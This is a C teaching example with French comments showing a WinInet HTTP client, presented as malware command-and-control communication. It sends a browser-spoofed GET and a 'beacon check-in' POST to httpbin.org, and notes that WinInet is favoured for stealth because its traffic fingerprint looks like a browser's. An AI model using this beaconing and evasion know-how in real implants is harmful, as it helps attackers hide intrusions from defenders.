/*
 * OBJECTIF  : Client HTTP avec WinInet (alternative a WinHTTP)
 * PREREQUIS : HTTP basics, WinHTTP
 * COMPILE   : cl example.c /Fe:example.exe /link wininet.lib
 *
 * WinInet utilise les parametres proxy du systeme automatiquement
 * et produit un JA3 plus "navigateur-like" que WinHTTP.
 */

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

void demo_wininet_get(void) {
    printf("[1] HTTP GET avec WinInet\n\n");

    HINTERNET hInet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) { printf("    [-] InternetOpen echoue\n\n"); return; }
    printf("    [+] Session WinInet ouverte (proxy auto)\n");

    HINTERNET hUrl = InternetOpenUrlA(hInet, "https://httpbin.org/get",
                                       NULL, 0, INTERNET_FLAG_SECURE, 0);
    if (hUrl) {
        char buf[1024] = {0};
        DWORD read = 0;
        InternetReadFile(hUrl, buf, sizeof(buf) - 1, &read);
        printf("    [+] Lu %lu octets\n", read);
        if (read > 200) buf[200] = '\0';
        printf("    %s...\n", buf);
        InternetCloseHandle(hUrl);
    } else {
        printf("    [-] InternetOpenUrl echoue (err %lu)\n", GetLastError());
    }
    InternetCloseHandle(hInet);
    printf("\n");
}

void demo_wininet_post(void) {
    printf("[2] HTTP POST beacon check-in\n\n");

    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) return;

    HINTERNET hConn = InternetConnectA(hInet, "httpbin.org",
                                        INTERNET_DEFAULT_HTTPS_PORT,
                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConn) {
        HINTERNET hReq = HttpOpenRequestA(hConn, "POST", "/post", NULL, NULL, NULL,
                                           INTERNET_FLAG_SECURE, 0);
        if (hReq) {
            const char* h = "Content-Type: application/json\r\n";
            const char* d = "{\"id\":\"beacon-001\",\"host\":\"PC01\"}";
            if (HttpSendRequestA(hReq, h, (DWORD)strlen(h), (LPVOID)d, (DWORD)strlen(d)))
                printf("    [+] POST reussi\n");
            InternetCloseHandle(hReq);
        }
        InternetCloseHandle(hConn);
    }
    InternetCloseHandle(hInet);
    printf("\n");
}

void demo_comparison(void) {
    printf("[3] WinInet vs WinHTTP\n\n");
    printf("    WinInet : proxy auto, cookies auto, JA3 navigateur-like\n");
    printf("    WinHTTP : plus de controle, async natif, usage serveur\n");
    printf("    C2 : WinInet souvent prefere pour la furtivite\n\n");
}

int main(void) {
    printf("[*] Demo : WinInet Client - Communication C2\n");
    printf("[*] ==========================================\n\n");
    demo_wininet_get();
    demo_wininet_post();
    demo_comparison();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
